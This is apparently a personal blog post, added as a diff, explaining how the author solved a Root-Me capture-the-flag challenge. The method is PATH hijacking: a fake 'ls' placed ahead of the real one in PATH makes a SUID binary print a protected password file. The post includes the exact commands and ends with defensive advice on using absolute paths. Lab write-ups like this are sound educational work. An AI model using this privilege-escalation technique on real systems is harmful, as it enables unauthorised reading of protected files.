@@ -1,0 +1,88 @@
+---
+title: "The fake `ls` that read a password"
+slug: "path-hijacking-suid"
+date: 2026-03-02
+lang: en
+translationSlug: "path-hijacking-suid-fr"
+type: journal
+category: App-Script
+difficulty: Easy
+tags: ["linux", "shell", "rootme", "ctf", "suid", "beginner"]
+platform: "Root-Me"
+excerpt: "A SUID binary, a missing absolute path, and a fake `ls`. How I got a password the program wasn't supposed to share."
+published: true
+---
+
+## Context
+
+Root-Me, App-Script category. The challenge gives me a SUID binary and its source code:
+
+```c
+int main(void) {
+    setreuid(geteuid(), geteuid());
+    system("ls /challenge/app-script/ch11/.passwd");
+    return 0;
+}
+```
+
+The binary runs as `app-admin`. It reads a password file I have no access to. My job: get that password.
+
+## What I noticed
+
+The program calls `ls` — but not `/bin/ls`. Just `ls`.
+
+That's the whole vulnerability. When a program calls a command without an absolute path, the shell looks for it in `$PATH`, in order. First match wins.
+
+I control `$PATH`.
+
+## What I did
+
+Create a fake `ls` in `/tmp`:
+
+```bash
+mkdir /tmp/exploit
+echo -e '#!/bin/bash\ncat $1' > /tmp/exploit/ls
+chmod +x /tmp/exploit/ls
+```
+
+Put `/tmp/exploit` first in the PATH:
+
+```bash
+export PATH=/tmp/exploit:$PATH
+```
+
+Run the binary:
+
+```bash
+./ch11
+```
+
+The program called my `ls`. My `ls` ran `cat` on the password file. With `app-admin`'s privileges. Password printed. Challenge done.
+
+## The SUID part
+
+The `s` in `-r-sr-x---` is what makes this dangerous. SUID means the binary runs as its *owner*, not as the user who launches it.
+
+Without SUID, the binary would still call my fake `ls` — but with my own permissions. I couldn't read the password file anyway. The privilege escalation only works because of SUID.
+
+`setreuid(geteuid(), geteuid())` in the source code makes it explicit: the program sets its real UID to match the effective UID (app-admin's). No downgrade. Full privileges for the lifetime of the process.
+
+## Why this matters outside CTFs
+
+This isn't a contrived CTF trick. In real environments, SUID binaries calling commands without absolute paths exist. Misconfigurations in custom scripts, legacy software, poorly written installers.
+
+If an attacker can write to any directory in `$PATH` before `/bin`, or modify `$PATH` in a session where a SUID binary gets called, the game is over.
+
+The fix is simple: always use absolute paths in privileged programs. `/bin/ls`, not `ls`. One extra character. The difference between safe and exploitable.
+
+## What I felt when it worked
+
+I ran `./ch11` expecting nothing. The password just printed.
+
+It felt like the program handed me the keys itself. Which is exactly what happened.
+
+## Resources
+
+- [Root-Me — Bash System 1](https://www.root-me.org/fr/Challenges/App-Script/Bash-System-1)
+- [SUID — Wikipedia](https://en.wikipedia.org/wiki/Setuid)
+- [PATH Hijacking — HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#path)
